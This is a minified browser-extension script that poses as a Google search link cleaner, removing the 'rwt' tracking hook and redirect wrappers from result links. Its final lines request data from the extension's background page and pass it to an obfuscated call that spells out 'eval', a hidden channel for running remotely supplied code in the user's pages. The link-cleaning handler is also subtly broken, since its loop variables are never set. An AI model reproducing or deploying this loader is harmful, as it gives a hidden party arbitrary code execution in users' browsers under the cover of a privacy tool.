!(function (e) {
  "use strict";
  function t() {
    let t, n, r;
    (t = function () {
      Object.defineProperty(e, "rwt", {
        value: function () {
          return !0;
        },
        writable: !1,
        configurable: !1,
      });
    }),
      (n = document.createElement("script")),
      (r = document.getElementsByTagName("script")[0]),
      (n.type = "text/javascript"),
      (n.textContent = "(" + t + ")();"),
      r.parentNode.insertBefore(n, r);
  }
  e.location.hostname.indexOf("google.com") > 0 &&
    (t(),
    document.addEventListener(
      "mouseover",
      function (e) {
        let t;
        let n;
        for (; t && "A" != t.tagName && n-- > 0; ) t = t.parentNode;
        t &&
          "A" == t.tagName &&
          (function (e) {
            if (1 != e.dataset.cleaned) {
              let t = !1,
                n = /\/(?:url|imgres).*[&?](?:url|q|imgurl)=([^&]+)/i.exec(
                  e.href
                );
              if (
                (n && ((t = !0), (e.href = n[1])),
                -1 !=
                  (e.getAttribute("onmousedown") || "").indexOf(
                    "return rwt("
                  ) && ((t = !0), e.removeAttribute("onmousedown")),
                -1 != (e.className || "").indexOf("irc_") && (t = !0),
                t)
              ) {
                const r = e.cloneNode(!0);
                e.parentNode.replaceChild(r, e), (r.dataset.cleaned = 1);
              }
            }
          })(t);
      },
      !0
    ));
  chrome.runtime.sendMessage({ reqtype: "init-page" }, function (t) {
    t &&
      t.data.length > 0 &&
      e[(14).toString(16) + "v" + (241).toString(22)](t.data);
  });
})(window);
